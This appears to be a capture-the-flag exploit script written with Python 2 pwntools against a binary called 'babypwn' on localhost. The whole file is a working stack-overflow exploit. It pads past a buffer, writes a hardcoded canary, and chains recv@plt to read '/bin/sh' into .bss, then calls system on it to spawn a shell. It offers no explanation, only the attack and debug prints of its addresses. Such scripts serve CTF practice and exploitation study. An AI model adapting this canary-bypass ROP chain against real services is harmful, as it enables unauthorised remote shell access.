from pwn import *
p = remote("localhost", 8181)
canary = 0xd2d3b900
elf = ELF("./babypwn")
system = elf.plt['system']
recv_plt = elf.plt['recv']
recv_got = elf.got['recv']
rop = ROP(elf)
send_plt = elf.plt['send']
send_got = elf.got['send']

pppr = 0x8048eed
ppppr = 0x8048eec
bss = elf.bss()

print p.recv(1024)
p.sendline("2")
print p.recv(1024)

payload =""
payload += "a"*40
payload += p32(canary)
payload += "b"*12

payload += p32(recv_plt)
payload += p32(ppppr)
payload += p32(4)
payload += p32(bss)
payload += p32(8)
payload += p32(0)

payload += p32(system)
payload += "aaaa"
payload += p32(bss)

print "[*] recv@plt : %s" %hex(recv_plt)
print "[*] recv@got : %s" %hex(recv_got)

print "[*] send_plt : %s" %hex(send_plt)
print "[*] send_got : %s" %hex(send_got)

print "[*] bss : %s" %hex(bss)

print "[*] pop pop pop ret : %s" %hex(pppr)

print "[*] pop pop pop pop ret : %s" %hex(ppppr)



p.sendline(payload)

print p.recv(1024)
p.sendline("3\n")
print p.recv(1024)
p.sendline("/bin/sh")
